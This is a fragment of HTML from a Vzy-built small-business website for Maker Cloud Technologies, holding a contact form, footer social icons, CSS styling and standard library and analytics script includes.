    left" id="hero-3"><section class="w-boxed min-shape section-content"><div class="banner-box section-bg-wrapper transparent	color     min-shape" style="--bg-color:--accent;--spacingTB:calc(var(--unit) * 5);--spacingLR:calc(var(--unit) * 2);"><div class="min-shape inner-content section-container"><!----><!----><!----><div class="hero-layout-3 w-boxed"><div class="hero section-component"><div class="hero-text content-heading" style=""><!----><h2 class="t-4 pre-line">Contact Maker Cloud</h2><p class="t-1 pre-line subtitle-width-size subtitle" data-size="100" style="">Contact Maker Cloud Technologies today to learn more about our innovative technology solutions that can help you achieve your business goals</p><!--[--><!----><!----><p class="t-0 feedback" id="feedbackMessage" style="display:none;">Thank you for subscribing</p><form class="email subscribe name subtitle-width-size" onsubmit="return false" data-form="more-input" data-size="100" style=""><input name="firstname" type="text" class="shape" placeholder="First name"><!----><input name="email" type="text" class="shape" placeholder="Email"><!----><!----><textarea style="margin-top:;" name="message" class="shape" placeholder="Message"></textarea><p class="t-0 feedback" id="feedbackMessage2" style="display:none;"> Thank you for subscribing </p><button class="site-btn t-1 shape mt-2">Send</button><!----></form><p id="error" class="error" style="display:none;">Thank you for subscribing</p><p class="t-1" id="feedback" style="display:none;">Thank you for subscribing</p><!--]--></div><!--[--><div id="hero-image_6" class="flip-layout hero-image min-shape" style="height:440px;--height:440px;"><!--[--><img src="https://images.unsplash.com/photo-1451187580459-43490279c0fa?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=M3wzNDk5MjB8MHwxfHNlYXJjaHw2fHxUZWNobm9sb2d5fGVufDB8fHx8MTcwNTQzOTA5Mnww&amp;ixlib=rb-4.0.3&amp;q=80&amp;w=1080" class="Fill grey"><!----><!--]--><!----><!----></div><!--]--></div></div><!----><!----><!----><span id="successMessage" style="display:none;">Thank you! Your submission has been received</span></div></div></section><!----><!----></div><!--[--><div class="footer-1 box v_2-footer" style="--logo-height:24px;"><div class="footer-card w-boxed"><div class="footer-top"><div class="footer-top__nav-container"><div class="single footer-nav mb-2 v_2-footer"><ul class="links"><!--[--><li class="empty-group link-group" style="--content-count: 0"><span class="t-0 group__heading" style="position:relative;">Group 1 <!----><!----></span><ul class="group__sub-links"><!--[--><!--]--></ul></li><!--]--></ul></div><div class="social-media-link"><ul><!--[--><li style=""><a class="shape" target="_blank" href="https://twitter.com/"><svg class="social-link__media-icon" width="24" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M8.2896 20.1256C15.8368 20.1256 19.9648 13.8728 19.9648 8.45036C19.9648 8.27276 19.9648 8.09596 19.9528 7.91996C20.7559 7.33909 21.4491 6.61987 22 5.79596C21.2511 6.12781 20.4567 6.34543 19.6432 6.44157C20.4998 5.92875 21.1409 5.12218 21.4472 4.17197C20.6417 4.64993 19.7605 4.98677 18.8416 5.16796C17.5697 3.81548 15.5486 3.48445 13.9116 4.36051C12.2747 5.23656 11.429 7.10183 11.8488 8.91036C8.54952 8.74496 5.47558 7.18662 3.392 4.62317C2.3029 6.49808 2.85919 8.89665 4.6624 10.1008C4.00939 10.0814 3.37062 9.90526 2.8 9.58717C2.8 9.60397 2.8 9.62157 2.8 9.63917C2.80053 11.5924 4.1774 13.2748 6.092 13.6616C5.4879 13.8263 4.85406 13.8504 4.2392 13.732C4.77676 15.4035 6.31726 16.5486 8.0728 16.5816C6.61979 17.7235 4.82485 18.3434 2.9768 18.3416C2.65032 18.3409 2.32416 18.3212 2 18.2824C3.87651 19.4866 6.05993 20.1253 8.2896 20.1224" fill="var(--c-mix-2)" fill-rule="evenodd" clip-rule="evenodd"></path></svg></a><!----></li><li style=""><a class="shape" target="_blank" href=""><svg class="social-link__media-icon" width="24" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20.525 2H3.475C2.66667 2 2 2.64167 2 3.43333V20.5667C2 21.3583 2.66667 22 3.475 22H20.525C21.3417 22 22 21.3583 22 20.5667V3.43333C22 2.64167 21.3333 2 20.525 2ZM8.05833 18.75H5.04167V9.7H8.05833V18.75ZM6.55833 8.46667H6.53333C5.51667 8.46667 4.86667 7.775 4.86667 6.90833C4.86667 6.025 5.53333 5.35 6.575 5.35C7.60833 5.35 8.24167 6.01667 8.25833 6.90833C8.25833 7.775 7.60833 8.46667 6.55 8.46667H6.55833ZM18.95 18.75H15.925V13.9167C15.925 12.7083 15.4917 11.875 14.4 11.875C13.5667 11.875 13.0667 12.4333 12.8417 12.975C12.7583 13.1667 12.75 13.4333 12.75 13.7083V18.75H9.73333C9.73333 18.75 9.775 10.5667 9.73333 9.71667H12.7583V11C13.3149 10.0341 14.3611 9.45642 15.475 9.5C17.4667 9.5 18.9583 10.8 18.9583 13.575V18.75H18.95Z" fill="var(--c-mix-2)" fill-rule="evenodd" clip-rule="evenodd"></path></svg></a><!----></li><li style=""><a class="shape" target="_blank" href="https://instagram.com/"><svg class="social-link__media-icon" width="24" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M16.1663 2C17.2497 2.08301 17.9163 2.24984 18.583 2.49967C19.2497 2.75033 19.7497 3.08317 20.333 3.66667C20.6105 3.94417 20.8314 4.22168 21.0048 4.50814C21.1958 4.82389 21.329 5.15104 21.4163 5.50016C21.6663 6.16667 21.833 6.83317 21.9163 7.91634C21.9282 8.05922 21.9384 8.1885 21.9472 8.31316L21.9645 8.58966C21.9896 9.05015 21.9968 9.54053 21.9989 10.5348L21.9994 10.9605C21.9995 11.0363 21.9995 11.1146 21.9996 11.1956V12.8044C21.9995 12.8854 21.9995 12.9637 21.9994 13.0395L21.9989 13.4652C21.9968 14.4592 21.9896 14.9493 21.9645 15.4097L21.9535 15.5933C21.9434 15.7469 21.9312 15.9043 21.9163 16.0829C21.833 17.166 21.6663 17.8334 21.4163 18.4999C21.1663 19.1664 20.833 19.666 20.2497 20.2495C19.8659 20.6971 19.4328 20.9982 18.9508 21.2269C18.8838 21.2586 18.8158 21.2888 18.7469 21.318C18.6658 21.3522 18.5834 21.3856 18.4997 21.4165C18.2046 21.5272 17.9095 21.6216 17.5782 21.6997C17.1611 21.7974 16.6868 21.8698 16.083 21.9162C15.5725 21.9593 15.2357 21.9804 14.6623 21.9903C14.3482 21.9958 13.9632 21.9982 13.4397 21.9993L12.5421 22C12.3724 22 12.192 22 11.9997 22H7.83301C6.74963 21.9162 6.08302 21.7494 5.41632 21.4995C4.74972 21.2497 4.24963 20.916 3.66634 20.3334C3.08305 19.7499 2.74969 19.1664 2.58297 18.4999C2.33303 17.8334 2.1663 17.166 2.08299 16.0829C2.06514 15.8685 2.05111 15.6849 2.04009 15.5015L2.03004 15.3171C2.0103 14.9128 2.00339 14.4625 2.00098 13.6574L2.00099 10.3382C2.00212 9.96585 2.00422 9.66952 2.00812 9.41862C2.01442 9.00765 2.02561 8.71794 2.04525 8.41602C2.05542 8.25895 2.06783 8.09864 2.08299 7.91634C2.08299 6.83317 2.24972 6.08284 2.49965 5.41634C2.61694 5.10384 2.75254 4.82796 2.92375 4.56266C3.11743 4.26237 3.35669 3.97673 3.66634 3.66667C4.24963 3.08317 4.83302 2.75033 5.41632 2.49967C6.08302 2.24984 6.83305 2.08301 7.91632 2.08301C8.13062 2.06522 8.3143 2.05124 8.4977 2.04026L8.68214 2.03025C9.11751 2.00908 9.60644 2.00272 10.5344 2.00082L16.1663 2ZM11.9996 6.83154C9.16622 6.83154 6.83284 9.16471 6.83284 11.9984C6.83284 14.832 9.16622 17.166 11.9996 17.166C14.8328 17.166 17.1662 14.832 17.1662 11.9984C17.1662 9.16471 14.8328 6.83154 11.9996 6.83154ZM11.9996 8.49821C13.9124 8.49821 15.4995 10.0859 15.4995 11.9984C15.4995 13.9116 13.9124 15.4985 11.9996 15.4985C10.0866 15.4985 8.49951 13.9116 8.49951 11.9984C8.49951 10.0859 10.0866 8.49821 11.9996 8.49821ZM17.333 5.49854C16.6663 5.49854 16.1663 5.99902 16.1663 6.66553C16.1663 7.33284 16.6663 7.83334 17.333 7.83334C17.9998 7.83334 18.4997 7.33284 18.4997 6.66553C18.4997 5.99902 17.9998 5.49854 17.333 5.49854Z" fill="var(--c-mix-2)" fill-rule="evenodd" clip-rule="evenodd"></path></svg></a><!----></li><li style=""><a class="shape" target="_blank" href="https://wa.me/"><svg class="social-link__media-icon" width="24" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12.0414 1.9552C14.7044 1.95625 17.2039 2.99296 19.0834 4.87463C20.9628 6.75625 21.9973 9.2574 21.9963 11.9173C21.9941 17.4061 17.5279 21.8721 12.0415 21.8721C10.3713 21.8715 8.73419 21.4534 7.28016 20.6604L2.00293 22.0447L3.4152 16.8862C2.54403 15.3764 2.08565 13.6639 2.08637 11.9093C2.08856 6.42064 6.55434 1.9552 12.0414 1.9552ZM8.51701 7.31219C8.35119 7.31219 8.08169 7.37444 7.85372 7.62341C7.6257 7.87248 6.98312 8.47425 6.98312 9.69854C6.98312 10.9229 7.87439 12.1056 7.99883 12.2716C8.12317 12.4377 9.75276 14.95 12.248 16.0275C12.8414 16.2838 13.3048 16.4369 13.666 16.5514C14.2619 16.7408 14.8041 16.7141 15.2327 16.65C15.7106 16.5786 16.7043 16.0483 16.9116 15.4673C17.1189 14.8862 17.1189 14.3882 17.0567 14.2845C16.9945 14.1807 16.8287 14.1184 16.58 13.9939C16.3312 13.8695 15.1084 13.2678 14.8804 13.1847C14.6523 13.1017 14.4865 13.0602 14.3207 13.3091C14.1549 13.5582 13.6782 14.1184 13.533 14.2845C13.388 14.4504 13.2429 14.4713 12.9942 14.3468C12.7454 14.2222 11.9439 13.9596 10.9939 13.1121C10.2544 12.4526 9.7552 11.6381 9.61009 11.389C9.46503 11.14 9.59462 11.0054 9.71921 10.8814C9.83109 10.7699 9.96794 10.5908 10.0923 10.4456C10.2166 10.3004 10.2581 10.1965 10.341 10.0307C10.4239 9.86456 10.3825 9.71935 10.3203 9.59487C10.2581 9.47038 9.76069 8.24599 9.55338 7.7479C9.35147 7.26293 9.14641 7.32861 8.99372 7.32093C8.8488 7.31372 8.68283 7.31219 8.51701 7.31219Z" fill="var(--c-mix-2)" fill-rule="evenodd" clip-rule="evenodd"></path></svg></a><!----></li><!--]--></ul></div></div><div class="footer-top__content-container"><div class="footer-logo mb-2"><div class="site-logo" style="height:auto !important;"><a href="https://makercloudtechnologies352.vzy.io" name="logo" class="logo"><!----><span class="t-2 logo-text" style="--text-count: 24">Maker Cloud Technologies</span></a><!----></div></div><!----><div class="footer-buttons__holder v_2-footer" style=""><!----><!----><!----></div></div></div><div class="footer-bottom" style="position:relative;"><div class="footer-bottom-left tip-tap-content__output"><p class="footer-bottom-left__content" style="color:var(--c-mix-3);">Maker Cloud Technologies</p></div><!----><!----><!----><!----></div></div><svg style="display:none;"><symbol id="plus" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 5V19" stroke="var(--foreground)"></path><path d="M5 12H19" stroke="var(--foreground)"></path></symbol></svg></div><!----><!----><!--]--><div
    style="
        background: var(--foreground);
        padding: 8px 12px;
        width: auto;
        position: fixed;
        bottom: 10px;
        right: 10px;
        border-radius: 3px;
        display: flex;
        align-items: center;
        z-index: 99999;
    "
>
    <a href="https://vzy.co/website-builder?ref=makercloudtechnologies352.vzy.io" target="blank" style="display: flex; align-items: center">
        <svg
            width="24"
            height="24"
            fill="none"
            viewBox="0 0 25 25"
            xmlns="http://www.w3.org/2000/svg"
            style="width: 12px; height: 12px; margin-left: -2px"
        >
            <path
                d="m16.921 0.73462-4.8 9.6v-6h-4.176l1.776-3.6h-9.6l12 24 12-24h-7.2z"
                clip-rule="evenodd"
                fill="var(--background)"
                fill-rule="evenodd"
            ></path>
        </svg>
        <span
            style="
                margin-left: 8px;
                color: var(--background);
                font-size: 13px;
                font-weight: 600;
                letter-spacing: -0.4px;
            "
            >Made in Vzy</span
        >
    </a>
</div>
  <style>
  :root {
    --sublinks-shape: var(--min-shape);
    --logo-height: 50px;
    --logo-height-mobile: 20px;
    --site-width: 1200px;
    --accent: #0000FF;
    --shape: var(--r-small);
    --min-shape: var(--min-r-small);
    --design-headFont: 'Titillium Web bold';
    --design-headWeight: 100;
    --design-bodyFont: 'Titillium Web regular';
    }
    button{
      background:#0000FF!important;
    }
    h1:not(.block-card), h2:not(.block-card), h3:not(.block-card), .mobile-nav-overlay .link__a, a.logo span, #preloader span, .billing-price .amount, .head-font {
      font-family:'Titillium Web bold'!important;
      font-weight:100!important;
    }
    p:not(.block-card),input,input::placeholder, .share-box-content, .mobile-nav-overlay a, textarea, h3.t-1.small-size, .display-options .display-style li, .pricing-benefits li, .price-title span, .body-font {
      font-family:'Titillium Web regular'!important;
    }
    header>nav>ul>li>a, button, .page-list, .navbar-box .sub-link{
      font-family:'Titillium Web regular'!important;
    }
    .footer-card ul>li>a, .footer-card .footer-bottom>.footer-bottom-right>a, .announcement-bar-block > a{
      font-family:'Titillium Web regular'!important;
    }
    button,  .pricing-box .pricing-container-small .pricing-section > .tier.popular-price > .pricing-details > a button{
      color:var(--c-light)!important;
    }

    h1{
      letter-spacing:-0.03em!important;
    }
    h2{
      letter-spacing:-0.02em!important;
    }
    h3{
      letter-spacing:-0.015em!important;
    }
    .logo-text {
      letter-spacing: -0.03em !important;
    }
    @media screen and (min-width: 1200px) {
      .w-boxed{
        max-width:1200px!important;
      }
    }
    @media screen and (max-width: 768px) {
      .w-boxed{
        width: 100%;
        max-width: 100%;
      }
    }
</style>

		    <p id="siteUrl" data-siteUrl="65a6ef9d8508075b7dce45dc"></p>
        </div>
    </body>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.4/gsap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.4/Observer.min.js"></script>
    <script src="https://app.vzy.co/assets/js/allCountries.js" defer></script>
    <script src="https://app.vzy.co/assets/js/vzy.js" defer></script>
    <script src="https://app.vzy.co/assets/js/tracker.js"></script>
    <script>
        ackeeTracker.create('https://analytics.vzy.co',{
            detailed: true,
            ignoreLocalhost: true
        }).record('5797a87f-4c51-4db2-825b-c5579a7e85af')
    </script>
    <script async src="//cdn.iframe.ly/embed.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js" integrity="sha256-/H4YS+7aYb9kJ5OKhFYPUjSJdrtV6AeyJOtTkw6X72o=" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
    
</html>
